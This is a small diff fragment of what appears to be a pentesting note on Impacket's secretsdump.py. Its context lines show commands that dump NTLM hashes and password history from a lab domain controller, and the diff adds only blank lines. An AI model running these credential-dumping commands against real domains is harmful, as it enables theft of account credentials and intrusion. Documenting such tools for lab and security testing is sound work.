@@ -17,3 +17,5 @@ updated_at: '2023-04-10T20:26:32.381858+00:00'
 python secretsdump.py xxxxxxxxxx -just-dc
 python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
 ```
+
+
